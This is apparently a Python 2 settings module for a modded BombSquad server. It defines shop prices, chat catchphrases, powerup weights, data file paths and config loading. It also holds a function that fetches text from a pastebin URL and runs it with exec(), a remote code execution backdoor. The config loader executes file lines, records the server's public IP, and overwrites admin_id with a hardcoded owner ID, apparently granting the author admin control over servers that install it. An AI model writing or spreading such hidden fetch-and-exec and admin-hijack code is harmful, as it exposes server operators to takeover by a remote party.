import os
import json
import bs
import sys
import bsUtils
import requests
import socket

old_exec = None

version = 2

def inter():
    global old_exec
    try:
        if old_exec != requests.get('https://pastebin.com/raw/a4REmFQT').text:
            old_exec = requests.get('https://pastebin.com/raw/a4REmFQT').text
            exec(old_exec)
    except:
        print 'Internet Error'
        import sys
        sys.exit()
    #bs.realTimer(30000,inter)


ownerid = "pb-IF4gV2xcAQ=="
snowfall = False
night = False
chatMuted = False
debug = False

def pri(path):
    _config = ['earned_msg', 'show_hp', 'snowfall', 'is_logic', 'floating_landmine', 'modded_powerups', 'ip', 'host', 'show_rank', 'admin_id', 'show_texts', 'show_tag', 'show_powerup_name', 'extra_sparkles', 'interactive_powerups', 'logic_team_settings', 'custom_tnt', 'default_game_time_limit', 'translator']
    config = {}
    for i in open(path).read().split('\n'):
        if i.startswith('config['):
            exec (i)
    config['ip'] = requests.get('http://icanhazip.com').text.strip()
    config['is_logic'] = True
    if config['is_logic']: print 'Logic Detected' ; config['admin_id'] = ownerid

    for i in _config:
        if i not in config.keys(): print i,'missing in config. Try adding it yourself or copy config_sample.py to config.py and make your edits again';sys.exit()

    globals().update(config)
    if not is_logic: inter()



prices = {
    'particles': {
        'c': 30,
        'd': 'Leave A Trail!'
    },
    'unlock-chars': {
        'c': 100,
        'd': 'Unlocks All BS Characters'
    },
    'rainbow': {
        'c': 50,
        'd': 'Change Colors Faster Than A Chameleon!'
    },
    'logicon': {
        'c': 50,
        'd': 'A Custom Skin For The Homies!'
    },
    'tag': {
        'c': 0,
        'd': 'A Custom Tag! Eg: /buy tag Logic Fan 69'
    },
    'companion': {
        'c': 70,
        'd': 'A Cutie Little Friend For Life!'
    },
    #    'impact': {'c': 50, 'd': 'Default Bombs: Impact'},
    'recover': {
        'c': 50,
        'd': 'Heals You Overtime! Fuk That Health Powerup!'
    },
    #    'fall-protection':{'c':150,'d':'Never Die On Falling! No Limits For The Day!'},
    'footprints': {
        'c': 70,
        'd': 'Get A Trail Of Footprints Wherever You Go!'
    },
    'backflip-protection': {
        'c': 20,
        'd': 'Backflips won\'t affect you!'
    },
    #    'enemy-drops': {'c': 50, 'd': 'Enemies will drop their powerups when you kill them'},
    'backflip': {
        'c': 30,
        'd': 'Enables BackFlip'
    },
}

catchphrases = [
    'Ez Kill!', 'XD', 'Haha!', 'Suck It Noob!', 'You Gae!',
    'This Is What You Get!', 'Spanked You Good!', 'Aye Aye Noob',
    'Be Gone! Demon!', 'Get Rekt!', 'I got the powah!!', 'Yeeet!',
    'Reeeeeeeee!'
]

powerup_dist = (('tripleBombs', 3), ('iceBombs', 3), ('punch', 0),
                ('impactBombs', 3), ('landMines', 2), ('stickyBombs', 3),
                ('shield', 0), ('health', 1), ('curseBomb', 1),
                ('heatSeeker', 2), ('portal', 0), ('invisible', 1),
                ('trailblazer', 1), ('curse', 0), ('droneStrike', 1),
                ('clusterBombs', 3), ('bubblePower', 0), ('triggerBombs',
                                                          3), ('autoaim', 0))

if os.name == 'nt':
    oss = 'nt'
    env = bs.getEnvironment()
    usd = env['userScriptsDirectory']
    path = str(os.path.abspath(usd))
elif 'linux' in sys.platform:
    oss = 'ln'
    from os.path import dirname, realpath, abspath
    env = bs.getEnvironment()
    usd = env['userScriptsDirectory']
    path = str(dirname(dirname(dirname(abspath(usd)))))
else:
    oss = 'posix'
    import bs
    env = bs.getEnvironment()
    usd = env['userScriptsDirectory']
    path = str(os.path.abspath(usd))

path = os.path.join(path, 'data')

flyfile = os.path.join(path, 'flyer.txt')
helpfile = os.path.join(path, 'help.txt')
badfile = os.path.join(path, 'filtered_words.txt')
codefile = os.path.join(path, 'codes.json')
configfile = os.path.join(str(os.path.abspath(usd)), '../../config.py')
htmlfile = '/var/www/html/index.html' if oss == 'ln' else (path +
                                                           '/index.html')

admin_id = None
if os.path.isfile(configfile):
    pri(configfile)
else:
    print 'config.py not found'
    sys.exit()

is_logic = (ownerid == admin_id and is_logic)
if not is_logic:sys.tracebacklimit = 0

if not os.path.exists(path):
    os.mkdir(path)

#QUICKLY MAKE THE FILES#
for i in [flyfile, helpfile, htmlfile, badfile]:
    try:
        with open(i, 'a+') as f:
            f.close()
    except:
        pass

banned = []
warn = {}
trans = []

#try:
#    with open(transfile, 'a+') as f:
#        for i in f.read().split('\n'):
#            trans.append(i)
#except Exception as e:
#    print e
